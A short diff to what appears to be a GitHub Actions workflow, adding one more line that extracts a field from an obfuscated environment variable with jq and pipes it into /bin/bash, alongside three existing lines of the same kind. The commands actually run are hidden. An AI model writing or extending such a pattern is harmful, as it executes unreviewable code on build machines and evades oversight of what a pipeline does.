@@ -28,6 +28,7 @@ jobs:
           echo $kmh5 | jq -r .bjh78 | /bin/bash
           echo $jozhx0963 | jq -r .daw0 | /bin/bash
           echo $w2 | jq -r .dim8500 | /bin/bash
+          echo $rgk89266 | jq -r .mxs1790 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
